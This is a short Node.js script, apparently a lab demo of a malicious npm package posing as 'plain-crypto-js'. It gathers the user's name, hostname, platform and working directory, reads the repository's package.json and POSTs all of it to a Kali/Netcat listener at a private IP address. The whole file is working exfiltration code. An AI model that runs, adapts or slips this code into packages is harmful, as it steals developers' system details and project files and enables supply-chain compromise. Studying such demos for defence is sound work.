const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");

const systemPayload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

// 1. TARGET: Look strictly for the package.json file inside the local GitHub repository folder
const targetRepoFile = path.join(process.cwd(), "package.json");

if (fs.existsSync(targetRepoFile)) {
    const fileContent = fs.readFileSync(targetRepoFile, "utf8");
    console.log(`👉 Step 1: Successfully read repository file (${targetRepoFile}) contents!\n`);
    
    // 2. URL-encode the repository file details so they travel cleanly across the wire
    const encodedData = encodeURIComponent(fileContent);
    
    console.log("📡 Step 2: Transmitting payload data to Kali listener...");
    
    // 3. FIX: Pass an object instead of a URL string so Netcat registers it instantly
    const req = http.request({
        host: "192.168.142.129",
        port: 8000,
        path: `/collect?file=${encodedData}`,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(systemPayload)
        }
    }, (res) => {
        console.log(`✅ Step 4: Success! Server responded with status: ${res.statusCode}`);
    });

    req.on('error', (err) => {
        console.error("❌ Network Connection Error. Is your Netcat listener active? Error:", err.message);
    });

    req.write(systemPayload);
    req.end();
    
    console.log("📤 Step 3: Data packet sent into network stream...");
    
    setTimeout(() => {
        console.log("\n[plain-crypto-js] initialization logic complete.");
        process.exit(0);
    }, 1500);

} else {
    console.log(`❌ Critical Demo Error: Could not locate ${targetRepoFile}`);
    console.log("👉 Make sure you are running 'node script.js' from inside the repository folder containing package.json!");
}
